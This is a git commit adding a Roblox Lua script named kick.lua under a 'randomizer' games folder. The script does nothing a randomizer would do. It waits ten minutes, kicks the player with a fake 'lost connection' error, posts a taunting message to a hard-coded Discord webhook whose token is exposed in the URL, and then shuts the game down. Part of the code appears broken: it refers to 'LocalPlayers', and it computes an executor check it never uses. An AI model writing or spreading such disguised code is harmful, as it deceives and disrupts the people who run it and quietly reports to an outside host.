d38254206a41052fab29223bb20baf8e7553f9c5
brokelynn <108573568+brokelynn@users.noreply.github.com>
2022-08-01 01:00:10 +0700

    Create kick.lua

---
+++ games/randomizer/kick.lua
@@ -0,0 +1,23 @@
+   wait(600)
+    game.Players.LocalPlayers:Kick("lost connection to game server, please try reconnecting")
+local webhookcheck =
+    syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or identifyexecutor():find("ScriptWare") or "unsupported"
+   
+  
+   
+
+local url =
+   "https://discord.com/api/webhooks/1000355102739152937/SC39amWbLYrhHR96LMUBpA-Z01Ke3fdMWNR-eOSC3hErxY0Af-FSAsNvud508eu8hVZt"
+local data = {
+   ["content"] = "<@706062672403234856> kicked! gg ez bois",
+   }
+   local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or syn.request or http.request or fluxus.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+wait(2)
+game:Shutdown()
